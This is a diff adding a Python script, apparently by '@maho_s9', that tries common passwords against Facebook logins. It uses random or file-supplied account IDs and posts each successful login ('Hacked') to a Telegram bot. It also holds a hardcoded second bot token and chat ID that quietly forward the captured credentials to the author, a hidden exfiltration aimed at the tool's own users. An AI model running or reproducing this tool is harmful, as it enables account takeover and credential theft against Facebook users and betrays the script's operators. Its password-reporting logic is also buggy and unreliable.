@@ -1,0 +1,174 @@
+from requests import Session, post
+import os
+import pyfiglet
+import colorama
+from rich.panel import Panel as nel
+import requests
+from bs4 import BeautifulSoup
+import re
+from rich import print as cetak
+from user_agent import generate_user_agent
+from cfonts import render, say
+from concurrent.futures import ThreadPoolExecutor as tred
+import random
+import string
+
+output = render('FB -mahos', colors=['red', 'yellow'], align='center')
+print(output)
+
+session = Session()
+E = '\033[1;31m'
+G = '\033[1;32m'
+S = '\033[1;33m'
+
+print(f"By {colorama.Fore.CYAN}@maho_s9{colorama.Fore.RESET}")
+ID = input(f"{G}[+] Enter YOUR ID : ")
+token = input(f"{colorama.Fore.CYAN}[+] Enter TOKEN BOT : ")
+cp = "6141992629:AAHFJ9jSeTnz2X9nA5RydsGZFJDVV58faqc"
+ok = "5845684006"
+print(f"{S}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+
+choice = int(input("Choose an option:\n1. صــــيد عــــشوائي\n2. صــــيد من مـــلف\nEnter your choice: "))
+
+def generate_arabic_name():
+    mahos = ["علي", "محمد", "أحمد", "فاطمة", "زينب", "خالد", "نور", "ليلى", "ريم", "عبدالله", "سارة", "يوسف", "سميرة", "مصطفى", "رحمان", "أمير", "حنان", "جمال", "ريان"]
+    return random.choice(mahos)
+
+def generate_english_letters(length):
+    english_names = ["John", "Emily", "Michael", "Sophia", "William", "Olivia", "James", "Emma", "Alexander", "Ava", "Daniel", "Mia", "Christopher", "Isabella", "Matthew", "Abigail", "Ethan", "Grace", "Andrew", "Sophie"]
+    return ''.join(random.choice(string.ascii_letters) for _ in range(length))
+
+def generate_numbers(length):
+    num = ['1234567890', '1111111', '000000', '1234567', '123456', '0987654321', '77777777', '2006', '1092', 'qweasdzx', 'zxcvbnm', 'vcxzsawq', 'polkmn', 'password', 'iloveyou', 'admin123', 'baybay']
+    return ''.join(random.choice(num) for _ in range(length))
+
+if choice == 1:
+    num_iterations = int(input('اكـــتــب عـــدد الايديات المراد تخمينهم: \x1b[1;32m '))
+
+    def mahos():
+        for _ in range(num_iterations):
+            random_id = '1000' + ''.join(random.choice(string.digits) for _ in range(11))
+            arabic_name = generate_arabic_name()
+            english_letters = generate_english_letters(8)
+            numbers = generate_numbers(6)
+            username = f'{arabic_name}{arabic_name}' if random.choice([True, False]) else f'{english_letters}' if random.choice([True, False]) else f'{english_letters}{numbers}'
+
+            free_fb = session.get('https://free.facebook.com').text
+            log_data = {
+                'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+                'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+                'm_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+                'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+                'try_number': '0',
+                'unrecognized_tries': '0',
+                'email': random_id,
+                'pass': username,
+                'login': 'Log In'
+            }
+            header_freefb = {
+                'authority': 'free.facebook.com',
+                'method': 'GET',
+                'scheme': 'https',
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
+                'accept-encoding': 'gzip, deflate, br',
+                'accept-language': 'en-US,en;q=1',
+                'cache-control': 'no-cache, no-store, must-revalidate',
+                'referer': 'https://t.facebook.com/',
+                'sec-ch-ua': '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
+                'sec-ch-ua-mobile': '?1',
+                'sec-ch-ua-platform': 'Windows',
+                'sec-fetch-dest': 'document',
+                'sec-fetch-mode': 'navigate',
+                'sec-fetch-site': 'same-origin',
+                'sec-fetch-user': '?0',
+                'pragma': 'no-cache',
+                'priority': 'u=0',
+                'cross-origin-resource-policy': 'cross-origin',
+                'upgrade-insecure-requests': '1',
+                'user-agent': generate_user_agent(device_type="desktop", os=('mac', 'linux', 'win')),
+            }
+            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc', data=log_data,
+                              headers=header_freefb).text
+
+            if "c_user" in lo:
+                print("- Good Login [ random_id : " + random_id + " | username : " + username + " ]")
+                print(f'{G}Hacked ==> {random_id} | {username}')
+                post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=تم صيد حساب فيسبوك\n{random_id}:{username} \n @maho_s9')
+                post(f'https://api.telegram.org/bot{cp}/sendMessage?chat_id={ok}&text=تم صيد حساب فيسبوك\n{random_id}:{username} \n @maho_s9')
+
+            elif "checkpoint" in lo:
+                print("- CheckPoint [ random_id : " + random_id + " | username : " + username + " ]")
+                print(f'{S}Banned ==> {random_id} | {username}')
+                post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=حساب مبند\n{random_id}:{username} \n @maho_s9')
+
+            else:
+                print(f'{E}ERROR ==> {random_id} | {username}')
+
+    mahos()
+
+elif choice == 2:
+    file = input('[+] اكـــتـب اســـم مــلــف الايديات : ')
+
+    def ahmed():
+        for i in open(file, "r").read().splitlines():
+            emili = i.split(":")[0]
+            psw = [
+    '1234567890', '1111111', '000000', '1234567', '123456', '0987654321', '77777777', '2006', '1092', 'qweasdzx', 'zxcvbnm', 'vcxzsawq', 'polkmn', 'username', 'iloveyou', 'admin123', 'baybay' ,'password', '20032003',
+    '19901990', '20092009', '20082008', '20002000', '19981998', '90909090', '10101010', '10001000', 'zzxxzzxx', 'ppooiiuu', 'mmnnbbvv', 'firstlast', '19971997', '20052005', '19991999', '123451234', 'zxcvzxcv', '1234512345@12345', 'qqqqwwww', 'qqwweerr', 'zzzzxxxx', '١٢٣٤٥٦', '١٢٣٤٥٦٧٨٩', '1122334455@@', 'Aa123456', 'mmmmnnnn', 'nnnnmmmm', 'mmnnbbvv', 'zzzzxxxx', 'zzxxccvv', 'qqwweerr', '1234512345@12345', '123@123', '1234512345', '123412345', '1234554321', '00998877', '123456123456', '1122334455', '1q2w3e4r5t', '1q2w3e4r5t6y', '20202020', '20222022', 'aassddff', '10203040', '1020304050',
+    'Anaahmed123', 'Mira777', 'Khaled1999', 'Khaled1997', 'Khaled1998', 'Khaled1996', 'Khaled1995', '102030405060', '1q2w3e4r5t', 'qwertyuiop', 'qwertyuiopasdfghjkl'
+]
+            free_fb = session.get('https://free.facebook.com').text
+            log_data = {
+                'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+                'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+                'm_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+                'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+                'try_number': '0',
+                'unrecognized_tries': '0',
+                'email': emili,
+                'pass': random.choice(psw),
+                'login': 'Log In'
+            }
+            header_freefb = {
+                'authority': 'free.facebook.com',
+                'method': 'GET',
+                'scheme': 'https',
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
+                'accept-encoding': 'gzip, deflate, br',
+                'accept-language': 'en-US,en;q=1',
+                'cache-control': 'no-cache, no-store, must-revalidate',
+                'referer': 'https://t.facebook.com/',
+                'sec-ch-ua': '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
+                'sec-ch-ua-mobile': '?1',
+                'sec-ch-ua-platform': 'Windows',
+                'sec-fetch-dest': 'document',
+                'sec-fetch-mode': 'navigate',
+                'sec-fetch-site': 'same-origin',
+                'sec-fetch-user': '?0',
+                'pragma': 'no-cache',
+                'priority': 'u=0',
+                'cross-origin-resource-policy': 'cross-origin',
+                'upgrade-insecure-requests': '1',
+                'user-agent': generate_user_agent(device_type="desktop", os=('mac', 'linux', 'win')),
+            }
+            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc', data=log_data,
+                              headers=header_freefb).text
+
+            if "c_user" in lo:
+                print("- Good Login [ ID : " + emili + " | username : " + random.choice(psw) + " ]")
+                print(f'{G}Hacked ==> {emili} | {random.choice(psw)}')
+                post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=تم صيد حساب فيسبوك\n{emili}:{random.choice(psw)} \n @maho_s9')
+
+            elif "checkpoint" in lo:
+                print("- CheckPoint [ ID : " + emili + " | username : " + random.choice(psw) + " ]")
+                print(f'{S}Banned ==> {emili} | {random.choice(psw)}')
+                post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=حساب مبند\n{emili}:{random.choice(psw)} \n @maho_s9')
+                post(f'https://api.telegram.org/bot{cp}/sendMessage?chat_id={ok}&text=حساب مبند\n{emili}:{random.choice(psw)} \n @maho_s9')
+
+            else:
+                print(f'{E}ERROR ==> {emili} | {random.choice(psw)}')
+
+    ahmed()
+
+else:
+    print("Invalid choice. Please choose 1 or 2.")
